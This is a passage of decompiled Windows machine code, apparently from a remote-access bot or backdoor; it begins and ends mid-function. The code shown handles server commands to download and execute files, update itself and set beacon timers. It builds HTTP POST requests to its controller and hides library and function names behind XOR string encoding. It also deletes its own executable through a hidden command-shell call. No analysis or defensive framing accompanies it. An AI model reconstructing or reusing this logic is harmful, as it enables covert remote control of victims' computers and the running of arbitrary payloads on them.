            iVar4 = FUN_00402140((int)puVar3 + 1);
            if (iVar4 == 0) {
              UVar9 = WinExec((LPCSTR)((int)&uStack_241 + 1),0);
              if (UVar9 < 0x21) {
                _sprintf((char *)&uStack_40e40,"Execution fail");
              }
              else {
                _sprintf((char *)&uStack_40e40,"Downloadexec success");
              }
            }
            else {
              _sprintf((char *)&uStack_40e40,"Download fail");
            }
          }
        }
      }
      else {
        local_a40 = 0;
        _memset(local_a3f,0,0x3ff);
        local_640[0] = '\0';
        _memset(local_640 + 1,0,0x3ff);
        uStack_e41._1_1_ = 0;
        _memset(auStack_e3f,0,0x3ff);
        (*DAT_0041a16c)(0,local_640);
        (*DAT_0041a160)(0x400,&local_a40);
        (*DAT_00419fec)(&local_a40,0,0,&local_a40);
        ppvVar7 = param_1;
        do {
          cVar1 = *(char *)ppvVar7;
          ppvVar7 = (void **)((int)ppvVar7 + 1);
        } while (cVar1 != '\0');
        uVar8 = FUN_004068f4((char *)ppvVar7);
        do {
          cVar1 = *(char *)ppvVar7;
          ppvVar7 = (void **)((int)ppvVar7 + 1);
        } while (cVar1 != '\0');
        iVar4 = (*DAT_0041a178)(&local_a40,0x40000000,0,0,2,0x80,0);
        if (iVar4 == -1) {
          _sprintf((char *)&uStack_40e40,"Update fail.");
        }
        else {
          (*DAT_0041a2ac)(iVar4,ppvVar7,uVar8,local_cc);
          (*DAT_0041a024)(iVar4);
          pcVar6 = local_640;
          pcVar13 = (char *)((int)&uStack_e41 + 1);
          do {
            cVar1 = *pcVar6;
            *pcVar13 = cVar1;
            pcVar6 = pcVar6 + 1;
            pcVar13 = pcVar13 + 1;
          } while (cVar1 != '\0');
          puVar14 = &uStack_e41;
          do {
            pcVar6 = (char *)((int)puVar14 + 1);
            puVar14 = (undefined2 *)((int)puVar14 + 1);
          } while (*pcVar6 != '\0');
          *puVar14 = 0x5f;
          pcVar6 = _strrchr(local_640,0x5c);
          if (pcVar6 != (char *)0x0) {
            *pcVar6 = '\0';
          }
          FUN_004061ca(local_640,(LPCSTR)((int)&uStack_e41 + 1));
          __errno();
          iVar4 = (*DAT_0041a2a8)(&local_a40,local_640,3);
          if (iVar4 == 0) {
            iVar4 = (*DAT_0041a140)(&local_a40,local_640);
          }
          GetLastError();
          if (iVar4 == 0) {
            local_c8 = 0x6e6b7f5a;
            local_c4 = 0x692f6a7b;
            local_c0 = 0x2163666e;
            local_bc = local_bc & 0xffffff00;
            pcVar6 = (char *)FUN_00402090();
          }
          else {
            local_c8 = 0x6e6b7f5a;
            local_c4 = 0x7c2f6a7b;
            local_c0 = 0x6a6c6c7a;
            local_bc = 0x217c7c;
            pcVar6 = (char *)FUN_00402090();
          }
          _sprintf((char *)&uStack_40e40,pcVar6);
          pcVar6 = _strrchr(local_640,0x5c);
          if (pcVar6 != (char *)0x0) {
            *pcVar6 = '\0';
          }
        }
      }
    }
    else {
      puVar3 = FUN_00406820((uint *)param_1,' ');
      local_28 = (char)*(undefined2 *)((int)puVar3 + 1);
      uStack_27._0_1_ = (undefined)((ushort)*(undefined2 *)((int)puVar3 + 1) >> 8);
      local_1c = (uint *)(undefined2 *)((int)puVar3 + 3);
      local_f0.tm_year = FUN_004068f4(&local_28);
      local_f0.tm_year = local_f0.tm_year + 100;
      uVar2 = *(undefined2 *)((int)puVar3 + 3);
      local_28 = (char)uVar2;
      uStack_27._0_1_ = (undefined)((ushort)uVar2 >> 8);
      local_1c = (uint *)(undefined2 *)((int)puVar3 + 5);
      local_f0.tm_mon = FUN_004068f4(&local_28);
      local_f0.tm_mon = local_f0.tm_mon + -1;
      uVar2 = *(undefined2 *)((int)puVar3 + 5);
      local_28 = (char)uVar2;
      uStack_27._0_1_ = (undefined)((ushort)uVar2 >> 8);
      local_1c = (uint *)(undefined2 *)((int)puVar3 + 7);
      local_f0.tm_mday = FUN_004068f4(&local_28);
      uVar2 = *(undefined2 *)((int)puVar3 + 7);
      local_28 = (char)uVar2;
      uStack_27._0_1_ = (undefined)((ushort)uVar2 >> 8);
      local_1c = (uint *)(undefined2 *)((int)puVar3 + 9);
      local_f0.tm_hour = FUN_004068f4(&local_28);
      uVar2 = *(undefined2 *)((int)puVar3 + 9);
      local_28 = (char)uVar2;
      uStack_27._0_1_ = (undefined)((ushort)uVar2 >> 8);
      local_1c = (uint *)(undefined2 *)((int)puVar3 + 0xb);
      local_f0.tm_min = FUN_004068f4(&local_28);
      uVar2 = *(undefined2 *)((int)puVar3 + 0xb);
      local_28 = (char)uVar2;
      uStack_27._0_1_ = (undefined)((ushort)uVar2 >> 8);
      local_1c = (uint *)((int)puVar3 + 0xd);
      local_f0.tm_sec = FUN_004068f4(&local_28);
      local_f0.tm_isdst = 0;
      _Var16 = __mktime64(&local_f0);
      DAT_0041a13c = (undefined4)((ulonglong)_Var16 >> 0x20);
      DAT_0041a138 = (undefined4)_Var16;
      if (_Var16 == -1) {
        puVar12 = (undefined4 *)&DAT_004164bc;
        puVar15 = &local_c8;
        for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {
          *puVar15 = *puVar12;
          puVar12 = puVar12 + 1;
          puVar15 = puVar15 + 1;
        }
        *(undefined2 *)puVar15 = *(undefined2 *)puVar12;
        pcVar6 = (char *)FUN_00402090();
        _sprintf((char *)&uStack_40e40,pcVar6);
      }
      else {
        local_c8 = 0x6a646e58;
        local_c4 = 0x6a62667b;
        local_c0 = 0x2f7c662f;
        local_bc = CONCAT13(local_bc._3_1_,0x772a);
        pcVar6 = (char *)FUN_00402090();
        _sprintf((char *)&uStack_40e40,pcVar6,_Var16);
        FUN_00403b50();
      }
    }
  }
  else {
    puVar3 = FUN_00406820((uint *)param_1,' ');
    local_1c = puVar3;
    iVar4 = FUN_004068f4((char *)((int)puVar3 + 1));
    local_2c = iVar4;
    do {
      puVar3 = (uint *)((int)puVar3 + 1);
      local_1c = puVar3;
      iVar5 = _isdigit((int)*(char *)puVar3);
    } while (iVar5 != 0);
    switch(*(char *)puVar3) {
    case 'H':
    case 'h':
      iVar4 = iVar4 * 3600000;
      local_2c = iVar4;
      break;
    case 'M':
    case 'm':
      iVar4 = iVar4 * 60000;
      local_2c = iVar4;
      break;
    case 'S':
    case 's':
      iVar4 = iVar4 * 1000;
      local_2c = iVar4;
    }
    if (iVar4 == 0) {
      puVar12 = (undefined4 *)&DAT_00416490;
      puVar15 = &local_c8;
      for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {
        *puVar15 = *puVar12;
        puVar12 = puVar12 + 1;
        puVar15 = puVar15 + 1;
      }
      *(undefined2 *)puVar15 = *(undefined2 *)puVar12;
      *(undefined *)((int)puVar15 + 2) = *(undefined *)((int)puVar12 + 2);
      pcVar6 = (char *)FUN_00402090();
      _sprintf((char *)&uStack_40e40,pcVar6);
    }
    else {
      local_c8 = 0x6a7b6146;
      local_c4 = 0x636e797d;
      local_c0 = 0x2f7c662f;
      local_bc = CONCAT13(local_bc._3_1_,0x6b2a);
      DAT_00419450 = iVar4;
      pcVar6 = (char *)FUN_00402090();
      _sprintf((char *)&uStack_40e40,pcVar6);
      FUN_00403b50();
    }
  }
  puVar12 = &uStack_40e40;
  do {
    cVar1 = *(char *)puVar12;
    puVar12 = (undefined4 *)((int)puVar12 + 1);
  } while (cVar1 != '\0');
  FUN_00402060((short *)&uStack_40e40);
  FUN_004042e0(&uStack_40e40,((int)puVar12 - ((int)&uStack_40e40 + 1) & 0xfffffff8U) + 8);
  _free(param_1);
  ExceptionList = local_10;
  return 0;
}



undefined4 Catch_00405396(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  return 0x405381;
}



undefined4 __cdecl FUN_004053e0(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  char cVar1;
  HMODULE hModule;
  int iVar2;
  uint *puVar3;
  undefined4 *puVar4;
  uint *puVar5;
  uint *puVar6;
  short *_Dst;
  short *psVar7;
  undefined4 uVar8;
  undefined4 *puVar9;
  uint uVar10;
  int iVar11;
  undefined4 unaff_ESI;
  undefined4 *puVar12;
  char *pcVar13;
  uint unaff_EDI;
  undefined4 *puVar14;
  undefined4 local_580;
  undefined4 uStack_57c;
  undefined4 uStack_578;
  undefined4 uStack_574;
  undefined4 local_570;
  undefined4 local_56c;
  undefined4 local_568;
  undefined local_564;
  undefined4 uStack_519;
  uint auStack_418 [2];
  uint uStack_40f;
  undefined uStack_408;
  undefined auStack_407 [1027];
  
  local_570 = 0x617d6a64;
  local_564 = 0;
  local_580 = 0;
  local_56c = 0x3d3c636a;
  local_568 = 0x63636b21;
  puVar9 = &local_570;
  do {
    *(byte *)puVar9 = *(byte *)puVar9 ^ 0xf;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  } while (*(byte *)puVar9 != 0);
  hModule = LoadLibraryA((LPCSTR)&local_570);
  local_56c = 0x634e636e;
  local_570 = 0x6d606348;
  local_568 = 0x6c6063;
  puVar9 = &local_570;
  do {
    *(byte *)puVar9 = *(byte *)puVar9 ^ 0xf;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  } while (*(byte *)puVar9 != 0);
  GetProcAddress(hModule,(LPCSTR)&local_570);
  local_570 = 0x6d606348;
  uVar10 = (uint)local_568 >> 0x10;
  local_56c = 0x7d49636e;
  local_568 = CONCAT22((ushort)uVar10 & 0xff00,0x6a6a);
  puVar9 = &local_570;
  do {
    *(byte *)puVar9 = *(byte *)puVar9 ^ 0xf;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  } while (*(byte *)puVar9 != 0);
  GetProcAddress(hModule,(LPCSTR)&local_570);
  iVar2 = FUN_004040b0(param_2,param_3);
  if (iVar2 != 0) {
    (*DAT_0041a18c)(uStack_57c);
    return 1;
  }
  uStack_408 = 0;
  _memset(auStack_407,0,0x3ff);
  iVar2 = (*DAT_00419f58)(uStack_57c,&uStack_408,0x400,0);
  if ((iVar2 == -1) || (iVar2 == 0)) {
    (*DAT_0041a18c)(uStack_57c);
    return 2;
  }
  puVar3 = FUN_00406780(&uStack_40f,"200 OK\r\n");
  if (puVar3 != &uStack_40f) {
    (*DAT_0041a18c)(uStack_57c);
    return 3;
  }
  local_580 = 0x7b61604c;
  uStack_574 = 0x2f35677b;
  uStack_57c = 0x227b616a;
  uStack_578 = 0x68616a43;
  uStack_519._3_1_ = 0;
  local_570 = local_570 & 0xffffff00;
  uStack_519._1_2_ = 0xa0d;
  puVar4 = (undefined4 *)FUN_00402090();
  puVar9 = puVar4;
  do {
    cVar1 = *(char *)puVar9;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  } while (cVar1 != '\0');
  puVar14 = &uStack_519;
  do {
    pcVar13 = (char *)((int)puVar14 + 1);
    puVar14 = (undefined4 *)((int)puVar14 + 1);
  } while (*pcVar13 != '\0');
  puVar12 = puVar4;
  for (uVar10 = (uint)((int)puVar9 - (int)puVar4) >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {
    *puVar14 = *puVar12;
    puVar12 = puVar12 + 1;
    puVar14 = puVar14 + 1;
  }
  for (uVar10 = (int)puVar9 - (int)puVar4 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {
    *(undefined *)puVar14 = *(undefined *)puVar12;
    puVar12 = (undefined4 *)((int)puVar12 + 1);
    puVar14 = (undefined4 *)((int)puVar14 + 1);
  }
  puVar3 = FUN_00406780(auStack_418,(char *)((int)&uStack_519 + 1));
  puVar9 = (undefined4 *)&DAT_0041661c;
  puVar4 = &local_580;
  for (iVar11 = 6; iVar11 != 0; iVar11 = iVar11 + -1) {
    *puVar4 = *puVar9;
    puVar9 = puVar9 + 1;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = *(undefined2 *)puVar9;
  uStack_519._1_2_ = 0xa0d;
  *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar9 + 2);
  uStack_519._3_1_ = 0;
  puVar4 = (undefined4 *)FUN_00402090();
  puVar9 = puVar4;
  do {
    cVar1 = *(char *)puVar9;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  } while (cVar1 != '\0');
  puVar14 = &uStack_519;
  do {
    pcVar13 = (char *)((int)puVar14 + 1);
    puVar14 = (undefined4 *)((int)puVar14 + 1);
  } while (*pcVar13 != '\0');
  puVar12 = puVar4;
  for (uVar10 = (uint)((int)puVar9 - (int)puVar4) >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {
    *puVar14 = *puVar12;
    puVar12 = puVar12 + 1;
    puVar14 = puVar14 + 1;
  }
  for (uVar10 = (int)puVar9 - (int)puVar4 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {
    *(undefined *)puVar14 = *(undefined *)puVar12;
    puVar12 = (undefined4 *)((int)puVar12 + 1);
    puVar14 = (undefined4 *)((int)puVar14 + 1);
  }
  puVar9 = &uStack_519;
  do {
    puVar4 = puVar9;
    puVar9 = (undefined4 *)((int)puVar4 + 1);
  } while (*(char *)((int)puVar4 + 1) != '\0');
  *(undefined2 *)(undefined4 *)((int)puVar4 + 1) = 0xa0d;
  *(undefined *)((int)puVar4 + 3) = 0;
  puVar5 = FUN_00406780(auStack_418,(char *)((int)&uStack_519 + 1));
  puVar6 = FUN_00406780(auStack_418,(char *)&DAT_00415c7c);
  puVar6 = puVar6 + 1;
  if (puVar3 != (uint *)0x0) {
    unaff_EDI = FUN_004068f4((char *)((int)puVar3 + 0x12));
  }
  if (puVar5 != (uint *)0x0) {
    FID_conflict__sscanf((char *)puVar6,"%x",&stack0xfffffa70);
    puVar6 = FUN_00406780(puVar6,(char *)&DAT_00415c88);
    puVar6 = (uint *)((int)puVar6 + 2);
  }
  if (unaff_EDI != 0) {
    _Dst = (short *)_malloc(unaff_EDI + 1);
    if (_Dst == (short *)0x0) {
      return 1;
    }
    _memset(_Dst,0,unaff_EDI + 1);
    uVar10 = (int)auStack_418 + (iVar2 - (int)puVar6);
    if (unaff_EDI < uVar10) {
      _memcpy(_Dst,puVar6,unaff_EDI);
    }
    else {
      _memcpy(_Dst,puVar6,uVar10);
      iVar2 = unaff_EDI - uVar10;
      pcVar13 = (char *)((int)_Dst + uVar10);
      iVar11 = (*DAT_00419f58)(unaff_ESI,pcVar13,iVar2,0);
      if (iVar11 != 0) {
        while (iVar11 != -1) {
          pcVar13 = pcVar13 + iVar11;
          iVar2 = iVar2 - iVar11;
          if ((iVar2 == 0) || (iVar11 = (*DAT_00419f58)(unaff_ESI,pcVar13,iVar2,0), iVar11 == 0))
          break;
        }
      }
    }
    (*DAT_0041a18c)(unaff_ESI);
    iVar2 = FUN_004068f4((char *)_Dst);
    psVar7 = _Dst;
    while (iVar2 != 0) {
      do {
        cVar1 = *(char *)psVar7;
        psVar7 = (short *)((int)psVar7 + 1);
      } while (cVar1 != '\0');
      FUN_00402060(psVar7);
      uVar8 = (*DAT_00419ff4)(0,0,FUN_004048e0,&stack0xfffffa74,0,0);
      (*DAT_0041a150)(uVar8,0xffffffff);
      psVar7 = (short *)((int)psVar7 + iVar2);
      iVar2 = FUN_004068f4((char *)psVar7);
    }
    _free(_Dst);
  }
  return 0;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_00405850(char *param_1)

{
  char cVar1;
  char *pcVar2;
  uint *puVar3;
  int iVar4;
  uint uVar5;
  uint *puVar6;
  undefined4 *puVar7;
  uint uVar8;
  undefined4 *puVar9;
  undefined4 *puVar10;
  undefined4 local_1664;
  undefined4 local_1660;
  uint local_165c;
  undefined4 local_1658;
  undefined2 local_1654;
  undefined local_1652;
  char acStack_156b [7];
  undefined local_1564;
  undefined local_1563 [99];
  char local_1500 [255];
  undefined4 uStack_1401;
  undefined local_13fc [1020];
  char local_1000 [4092];
  undefined4 uStack_4;
  
  uStack_4 = 0x40585a;
  local_1564 = 0;
  _memset((void *)((int)&local_1564 + 1),0,99);
  _memset((void *)((int)&local_1664 + 1),0,0xff);
  uStack_1401._1_1_ = 0;
  _memset((void *)((int)&uStack_1401 + 2),0,0x3ff);
  local_1500[0] = '\0';
  _memset(local_1500 + 1,0,0xff);
  local_1000[0] = '\0';
  _memset(local_1000 + 1,0,0xfff);
  pcVar2 = (char *)(DAT_00419f38 + 7);
  iVar4 = (int)&local_1564 - (int)pcVar2;
  do {
    cVar1 = *pcVar2;
    pcVar2[iVar4] = cVar1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  puVar3 = FUN_00406820((uint *)&local_1564,'/');
  if (puVar3 != (uint *)0x0) {
    puVar6 = puVar3;
    do {
      cVar1 = *(char *)puVar6;
      (local_1500 + -(int)puVar3)[(int)puVar6] = cVar1;
      puVar6 = (uint *)((int)puVar6 + 1);
    } while (cVar1 != '\0');
    *(undefined *)puVar3 = 0;
  }
  local_1664 = 0x5b5c405f;
  local_1660 = 0x2f7c2a2f;
  local_1658 = 0x3e213e20;
  local_165c = 0x5f5b5b47;
  local_1654 = (ushort)local_1654._1_1_ << 8;
  puVar7 = &local_1664;
  do {
    *(byte *)puVar7 = *(byte *)puVar7 ^ 0xf;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*(byte *)puVar7 != 0);
  iVar4 = 0;
  do {
    cVar1 = *(char *)((int)&local_1664 + iVar4);
    *(char *)((int)&uStack_1401 + iVar4 + 1) = cVar1;
    iVar4 = iVar4 + 1;
  } while (cVar1 != '\0');
  puVar7 = &uStack_1401;
  do {
    puVar9 = puVar7;
    puVar7 = (undefined4 *)((int)puVar9 + 1);
  } while (*(char *)((int)puVar9 + 1) != '\0');
  *(undefined2 *)(undefined4 *)((int)puVar9 + 1) = 0xa0d;
  puVar7 = &DAT_00416650;
  puVar10 = &local_1664;
  for (iVar4 = 0x15; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar10 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar10 = puVar10 + 1;
  }
  *(undefined *)((int)puVar9 + 3) = 0;
  puVar7 = &local_1664;
  while ((byte)local_1664 != 0) {
    *(byte *)puVar7 = *(byte *)puVar7 ^ 0xf;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
    local_1664._0_1_ = *(byte *)puVar7;
  }
  puVar7 = &local_1664;
  do {
    cVar1 = *(char *)puVar7;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (cVar1 != '\0');
  uVar5 = (int)puVar7 - (int)&local_1664;
  puVar7 = &uStack_1401;
  do {
    pcVar2 = (char *)((int)puVar7 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*pcVar2 != '\0');
  puVar9 = &local_1664;
  for (uVar8 = uVar5 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
    *puVar7 = *puVar9;
    puVar9 = puVar9 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar9;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  puVar7 = &uStack_1401;
  do {
    puVar9 = puVar7;
    puVar7 = (undefined4 *)((int)puVar9 + 1);
  } while (*(char *)((int)puVar9 + 1) != '\0');
  *(undefined2 *)(undefined4 *)((int)puVar9 + 1) = 0xa0d;
  *(undefined *)((int)puVar9 + 3) = 0;
  local_1660 = 0x7c2a2f35;
  local_1664 = 0x7b7c6047;
  local_165c = local_165c & 0xffffff00;
  puVar7 = &local_1664;
  do {
    *(byte *)puVar7 = *(byte *)puVar7 ^ 0xf;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*(byte *)puVar7 != 0);
  puVar7 = &local_1664;
  do {
    cVar1 = *(char *)puVar7;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (cVar1 != '\0');
  uVar5 = (int)puVar7 - (int)&local_1664;
  puVar7 = &uStack_1401;
  do {
    pcVar2 = (char *)((int)puVar7 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*pcVar2 != '\0');
  puVar9 = &local_1664;
  for (uVar8 = uVar5 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
    *puVar7 = *puVar9;
    puVar9 = puVar9 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar9;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  puVar7 = &uStack_1401;
  do {
    puVar9 = puVar7;
    puVar7 = (undefined4 *)((int)puVar9 + 1);
  } while (*(char *)((int)puVar9 + 1) != '\0');
  *(undefined2 *)(undefined4 *)((int)puVar9 + 1) = 0xa0d;
  *(undefined *)((int)puVar9 + 3) = 0;
  local_1664 = 0x686e7d5f;
  local_1660 = 0x2f356e62;
  local_1658 = 0x6a676c6e;
  local_165c = 0x6c226061;
  local_1654 = local_1654 & 0xff00;
  puVar7 = &local_1664;
  do {
    *(byte *)puVar7 = *(byte *)puVar7 ^ 0xf;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*(byte *)puVar7 != 0);
  puVar7 = &local_1664;
  do {
    cVar1 = *(char *)puVar7;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (cVar1 != '\0');
  uVar5 = (int)puVar7 - (int)&local_1664;
  puVar7 = &uStack_1401;
  do {
    pcVar2 = (char *)((int)puVar7 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*pcVar2 != '\0');
  puVar9 = &local_1664;
  for (uVar8 = uVar5 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
    *puVar7 = *puVar9;
    puVar9 = puVar9 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar9;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  puVar7 = &uStack_1401;
  do {
    puVar9 = puVar7;
    puVar7 = (undefined4 *)((int)puVar9 + 1);
  } while (*(char *)((int)puVar9 + 1) != '\0');
  *(undefined2 *)(undefined4 *)((int)puVar9 + 1) = 0xa0d;
  puVar7 = &DAT_004166c4;
  puVar10 = &local_1664;
  for (iVar4 = 0xc; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar10 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar10 = puVar10 + 1;
  }
  *(undefined *)((int)puVar9 + 3) = 0;
  puVar7 = &local_1664;
  while ((byte)local_1664 != 0) {
    *(byte *)puVar7 = *(byte *)puVar7 ^ 0xf;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
    local_1664._0_1_ = *(byte *)puVar7;
  }
  puVar7 = &local_1664;
  do {
    cVar1 = *(char *)puVar7;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (cVar1 != '\0');
  uVar5 = (int)puVar7 - (int)&local_1664;
  puVar7 = &uStack_1401;
  do {
    pcVar2 = (char *)((int)puVar7 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*pcVar2 != '\0');
  puVar9 = &local_1664;
  for (uVar8 = uVar5 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
    *puVar7 = *puVar9;
    puVar9 = puVar9 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar9;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  puVar7 = &uStack_1401;
  do {
    puVar9 = puVar7;
    puVar7 = (undefined4 *)((int)puVar9 + 1);
  } while (*(char *)((int)puVar9 + 1) != '\0');
  *(undefined2 *)(undefined4 *)((int)puVar9 + 1) = 0xa0d;
  *(undefined *)((int)puVar9 + 3) = 0;
  local_1660 = 0x227b616a;
  local_165c = 0x68616a63;
  local_1664 = 0x7b61604c;
  local_1654 = 0x6b2a;
  local_1658 = 0x2f35677b;
  local_1652 = 0;
  puVar7 = &local_1664;
  do {
    *(byte *)puVar7 = *(byte *)puVar7 ^ 0xf;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*(byte *)puVar7 != 0);
  puVar7 = &local_1664;
  do {
    cVar1 = *(char *)puVar7;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (cVar1 != '\0');
  uVar5 = (int)puVar7 - (int)&local_1664;
  puVar7 = &uStack_1401;
  do {
    pcVar2 = (char *)((int)puVar7 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  } while (*pcVar2 != '\0');
  puVar9 = &local_1664;
  for (uVar8 = uVar5 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
    *puVar7 = *puVar9;
    puVar9 = puVar9 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar9;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  puVar7 = &uStack_1401;
  do {
    puVar9 = puVar7;
    puVar7 = (undefined4 *)((int)puVar9 + 1);
  } while (*(char *)((int)puVar9 + 1) != '\0');
  *(undefined4 *)((int)puVar9 + 1) = 0xa0d0a0d;
  *(undefined *)((int)puVar9 + 5) = 0;
  puVar7 = &uStack_1401;
  do {
    puVar9 = puVar7;
    puVar7 = (undefined4 *)((int)puVar9 + 1);
  } while (*(char *)((int)puVar9 + 1) != '\0');
  *(undefined2 *)(undefined4 *)((int)puVar9 + 1) = 0x7325;
  *(undefined *)((int)puVar9 + 3) = 0;
  pcVar2 = param_1;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  _sprintf(local_1000,(char *)((int)&uStack_1401 + 1),local_1500,&local_1564,
           (int)pcVar2 - (int)(param_1 + 1),param_1);
  pcVar2 = local_1000;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  FUN_004053e0(&local_1564,local_1000,(int)pcVar2 - (int)(local_1000 + 1));
  return;
}



undefined4 FUN_00405ce0(undefined4 param_1,undefined4 param_2,uint *param_3)

{
  char cVar1;
  uint *puVar2;
  int iVar3;
  HANDLE hFile;
  HMODULE pHVar4;
  FARPROC pFVar5;
  DWORD DVar6;
  char *pcVar7;
  uint uVar8;
  undefined4 *puVar9;
  uint uVar10;
  undefined2 *puVar11;
  undefined4 *puVar12;
  undefined4 uVar13;
  undefined *puVar14;
  undefined *puVar15;
  undefined local_518 [400];
  char local_388 [255];
  undefined2 uStack_289;
  CHAR local_188 [256];
  undefined4 local_88;
  undefined4 local_84;
  undefined2 local_80;
  undefined local_7e;
  DWORD local_24;
  DWORD local_20;
  undefined8 local_1c;
  undefined *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00413bd0;
  local_10 = ExceptionList;
  local_14 = &stack0xfffffadc;
  ExceptionList = &local_10;
  FUN_00403fb0();
  puVar2 = FUN_00406780(param_3,"/run");
  if (puVar2 == (uint *)0x0) {
    FUN_00403cc0();
    GetModuleFileNameA((HMODULE)0x0,local_188,0x100);
    _sprintf((char *)((int)&uStack_289 + 1),"/c del /q \"%s\" >> NUL",local_188);
    DVar6 = GetEnvironmentVariableA("ComSpec",local_188,0x104);
    if (DVar6 != 0) {
      pHVar4 = LoadLibraryA("Shell32.dll");
      pFVar5 = GetProcAddress(pHVar4,"ShellExecuteA");
      if (pFVar5 != (FARPROC)0x0) {
        (*pFVar5)(0,0,local_188,(int)&uStack_289 + 1,0,0);
      }
    }
                    // WARNING: Subroutine does not return
    ExitProcess(0);
  }
  GetModuleFileNameA((HMODULE)0x0,local_188,0x100);
  iVar3 = 0;
  do {
    cVar1 = local_188[iVar3];
    *(char *)((int)&uStack_289 + iVar3 + 1) = cVar1;
    iVar3 = iVar3 + 1;
  } while (cVar1 != '\0');
  puVar11 = &uStack_289;
  do {
    pcVar7 = (char *)((int)puVar11 + 1);
    puVar11 = (undefined2 *)((int)puVar11 + 1);
  } while (*pcVar7 != '\0');
  *puVar11 = 0x5f;
  DeleteFileA((LPCSTR)((int)&uStack_289 + 1));
  FUN_004061ca(local_188,(LPCSTR)((int)&uStack_289 + 1));
  CopyFileA((LPCSTR)((int)&uStack_289 + 1),local_188,1);
  hFile = CreateFileA(local_188,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    SetFilePointer(hFile,0,(PLONG)0x0,2);
    local_20 = GetTickCount();
    WriteFile(hFile,&local_20,1,&local_24,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
  }
  local_88 = 0x503d7c58;
  local_84 = 0x6b213d3c;
  local_80 = 0x6363;
  local_7e = 0;
  puVar9 = &local_88;
  do {
    *(byte *)puVar9 = *(byte *)puVar9 ^ 0xf;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  } while (*(byte *)puVar9 != 0);
  pHVar4 = LoadLibraryA((LPCSTR)&local_88);
  local_88 = 0x5c4e5c58;
  local_84 = 0x7b7d6e7b;
  local_80 = 0x7f7a;
  local_7e = 0;
  puVar9 = &local_88;
  do {
    *(byte *)puVar9 = *(byte *)puVar9 ^ 0xf;
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  } while (*(byte *)puVar9 != 0);
  pFVar5 = GetProcAddress(pHVar4,(LPCSTR)&local_88);
  local_8 = 0;
